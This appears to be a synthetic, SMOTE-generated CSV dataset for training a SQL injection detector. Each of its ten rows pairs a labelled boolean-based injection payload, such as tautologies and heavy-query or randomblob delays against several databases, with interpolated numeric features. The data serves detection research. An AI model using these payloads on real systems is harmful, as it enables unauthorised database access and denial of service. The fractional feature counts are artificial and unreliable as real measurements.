id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000105,1.7220053026604334,157.87650131027547,38.0,4.233519060828037,64.03187554594811,20.374499563241514,51.6573759827066,21.812750218379243,0.4055247744376953,0.13144274250375634,0.3250163964092365,0.13801608664931184,4.0,3.109562663784433,1.593624890810378,-1.3877787807814457e-17,0.0,1.296812445405189,0.0,6.812750218379244,0.0,0.0,0.0,6.890437336215568,1.0,1.0,0.296812445405189,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.2968124454051891,1.0,0.703187554594811,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000002,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000041,1.1918442775102553,71.68886907302607,20.17791648881755,2.995958649400361,7.1779164888175515,13.244523707895745,36.266428876312766,15.0,0.1004236388555817,0.18492552388344696,0.505404561066799,0.20924627619417235,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,5.377738146052128,2.0,0.3111309269739363,0.3111309269739362,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000003,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000078,0.3562492999591149,155.3448354053256,35.0,4.284365155531031,76.85580434884356,16.87774223587949,43.73354658472305,17.87774223587949,0.4946708531647841,0.10874892178020096,0.2813907222203207,0.11518950283469424,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.1222577641205085,0.0,0.0,2.8777422358794915,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.12225776412050882,0.8777422358794913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000004,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000117,0.6265161510085305,67.51516575311513,23.94318715741817,3.678707498295891,13.314395719139391,21.25758287655756,24.0,8.94318715741817,0.1974159255961146,0.31431813949714205,0.3565091721654873,0.13175676274125608,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.31439571913939,0.0,0.3143957191393898,0.3143957191393898,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,boolean,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,nearest_attack_euclidean,R000065,0.2761036030584416,134.36351681912603,28.242344546084016,4.024916290470698,66.66644750173104,10.0,35.878827726957994,21.81824159043699,0.4960187556060577,0.07443309337999678,0.2670936199319741,0.16245453108197142,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.9394138634789961,0.0,4.0,1.878827726957992,5.0,4.0,2.939413863478996,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.939413863478996,0.06058613652100392,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000006,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000054,1.2559029003874362,125.64653839251416,31.646538392514156,3.490759356702619,36.70692321497168,11.616345981285393,56.67673080374292,20.64653839251416,0.29227067357202663,0.09231986543215953,0.45113314406894856,0.16427631692686528,5.323269196257079,0.0,0.0,1.0,0.0,1.3232691962570786,0.0,10.67673080374292,1.3232691962570786,0.0,1.0,2.323269196257079,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6767308037429214,0.0,0.0,0.0,1.0,0.3232691962570786,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000050,1.039540112674626,134.05078124236502,29.210156248473,4.029541947294284,67.10156248473002,9.579687503053995,36.210156248473005,21.15937500610799,0.5002292159592114,0.07156971916108375,0.27013853417902195,0.1580625307006828,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,2.0,3.949218757634986,3.5796875030539943,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.2101562484730026,0.7898437515269972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000008,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000100,1.2110286308562481,78.0,29.0,3.9883707771723245,24.0,16.0,26.0,12.0,0.3076923076923077,0.20512820512820512,0.3333333333333333,0.15384615384615385,1.096907913381186,2.903092086618814,1.0,-1.3877787807814457e-17,0.0,1.0,0.0,4.0,0.0,1.0,1.0,2.0,0.2742269783452966,0.7257730216547034,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000009,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,2.219754765510272,90.3168161887373,28.402924554563008,3.6702502735096836,30.604386831844515,13.356214678446394,34.70511797048526,11.651096707961129,0.3445158081136796,0.13179302693611453,0.39005940831401736,0.13363175663618854,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.201462277281504,0.0,0.550365569320376,0.5503655693203762,5.449634430679624,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000010,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000069,1.1769157316755197,125.48474566366022,31.0,3.532388569465523,35.943220376127414,13.427966039787641,55.056779623872586,21.056779623872586,0.287029043614336,0.10654352006106216,0.43881002830017696,0.16761740802442485,5.685593207957528,0.0,0.0,1.0,0.0,1.6855932079575282,0.0,10.0,1.6855932079575282,0.0,1.0,2.6855932079575284,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3144067920424718,0.0,0.0,0.0,1.6855932079575282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
